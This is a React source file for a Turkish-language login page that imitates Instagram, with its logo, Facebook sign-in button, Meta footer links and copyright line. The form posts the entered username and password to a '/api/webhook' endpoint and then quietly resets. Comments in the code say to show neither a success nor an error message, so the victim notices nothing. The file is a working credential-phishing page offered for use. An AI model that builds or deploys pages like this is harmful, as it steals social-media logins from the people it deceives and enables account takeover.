import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { useMutation } from "@tanstack/react-query";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Loader2 } from "lucide-react";
import { LoginFormData, loginFormSchema } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";

export default function Login() {
  const form = useForm<LoginFormData>({
    resolver: zodResolver(loginFormSchema),
    defaultValues: {
      username: "",
      password: "",
    },
  });

  const { mutate, isPending } = useMutation({
    mutationFn: async (data: LoginFormData) => {
      const res = await apiRequest("POST", "/api/webhook", data);
      return res.json();
    },
    onSuccess: () => {
      // Sadece formu sıfırlayalım, başarı mesajı göstermeyelim
      form.reset();
    },
    onError: () => {
      // Hata mesajını da göstermeyelim
    },
  });

  function onSubmit(data: LoginFormData) {
    mutate(data);
  }

  return (
    <div className="bg-white min-h-screen">
      <div className="flex justify-center items-center p-1 pt-2">
        <div className="inline-flex items-center">
          <span className="text-[12px] text-[#8e8e8e] font-normal">Türkçe</span>
          <svg className="h-3 w-3 text-[#8e8e8e] ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
          </svg>
        </div>
      </div>
      
      <div className="max-w-[350px] mx-auto px-[40px] pt-[22px]">
        <div className="flex justify-center mb-[30px]">
          <img src="/images/instagram_logo.png" alt="Instagram" className="h-[65px] w-auto" />
        </div>
        
        <button 
          type="button"
          className="w-full bg-[#0095F6] text-white font-medium py-[5px] px-4 rounded-[4px] text-[14px] mb-[18px] flex items-center justify-center h-[34px]"
        >
          <svg className="h-5 w-5 mr-2 text-white" viewBox="0 0 320 512" fill="white" xmlns="http://www.w3.org/2000/svg">
            <path d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"/>
          </svg>
          Facebook ile Devam Et
        </button>
        
        <div className="flex items-center my-[15px]">
          <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
          <span className="mx-4 text-[13px] text-[#8e8e8e] font-semibold">YA DA</span>
          <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
        </div>
        
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-[6px]">
            <FormField
              control={form.control}
              name="username"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      placeholder="Telefon numarası, kullanıcı adı veya e-posta"
                      {...field}
                      className="instagram-input w-full focus:outline-none focus:ring-0 focus:border-[#dbdbdb]"
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500" />
                </FormItem>
              )}
            />

            <FormField
              control={form.control}
              name="password"
              render={({ field }) => (
                <FormItem>
                  <FormControl>
                    <Input
                      type="password"
                      placeholder="Şifre"
                      {...field}
                      className="instagram-input w-full focus:outline-none focus:ring-0 focus:border-[#dbdbdb]"
                    />
                  </FormControl>
                  <FormMessage className="text-xs text-red-500" />
                </FormItem>
              )}
            />

            <div className="text-right py-[8px]">
              <a href="#" className="text-[12px] text-[#00376b] font-medium">
                Şifreni mi unuttun?
              </a>
            </div>

            <button
              type="submit"
              disabled={isPending}
              className="instagram-btn w-full bg-[#0095F6] text-white font-medium rounded-[4px] h-[32px] mt-[8px] mb-[8px]"
            >
              {isPending ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Giriş yapılıyor...
                </>
              ) : (
                "Giriş yap"
              )}
            </button>
          </form>
        </Form>
        
        <div className="mt-[10px] mb-[10px] border-b border-[#dbdbdb]"></div>
        
        <div className="mt-[10px] text-center">
          <p className="text-[14px] text-[#8e8e8e]">
            Hesabın yok mu? <a href="#" className="text-[#0095F6] font-medium">Kaydol</a>
          </p>
        </div>
        
        <div className="text-center text-[12px] text-[#8e8e8e] mt-[68px] mb-[16px]">
          <p>
            Ayrıca ülkende giriş yapmadan <span className="text-[#00376B]">yasa dışı olduğunu düşündüğün içeriği şikayet edebilirsin</span>.
          </p>
        </div>
      </div>
      
      {/* Alt kısımdaki linkler */}
      <div className="mt-[60px]">
        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Meta</a>
          <a href="#" className="hover:underline mb-[8px]">Hakkında</a>
          <a href="#" className="hover:underline mb-[8px]">Blog</a>
          <a href="#" className="hover:underline mb-[8px]">İş Fırsatları</a>
          <a href="#" className="hover:underline mb-[8px]">Yardım</a>
          <a href="#" className="hover:underline mb-[8px]">API</a>
        </div>
        
        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Gizlilik</a>
          <a href="#" className="hover:underline mb-[8px]">Çerez Ayarları</a>
          <a href="#" className="hover:underline mb-[8px]">Koşullar ve Künye</a>
          <a href="#" className="hover:underline mb-[8px]">Konumlar</a>
        </div>
        
        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Instagram Lite</a>
          <a href="#" className="hover:underline mb-[8px]">Threads</a>
        </div>

        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px]">
          <a href="#" className="hover:underline mb-[8px]">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
          <a href="#" className="hover:underline mb-[8px]">Meta Verified</a>
        </div>
        
        <div className="flex flex-wrap justify-center gap-x-[20px] text-[12px] text-[#8e8e8e] leading-[16px] mb-[8px]">
          <a href="#" className="hover:underline mb-[8px]">Sözleşmeleri burada iptal et</a>
        </div>
        
        <div className="flex justify-center items-center gap-[15px] text-[12px] text-[#8e8e8e] mb-[20px] mt-[20px]">
          <div className="inline-flex items-center">
            <span className="text-[12px] text-[#8e8e8e] font-normal">Türkçe</span>
            <svg className="h-[10px] w-[10px] text-[#8e8e8e] ml-1" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
            </svg>
          </div>
          <span>© 2025 Instagram from Meta</span>
        </div>
      </div>
    </div>
  );
}
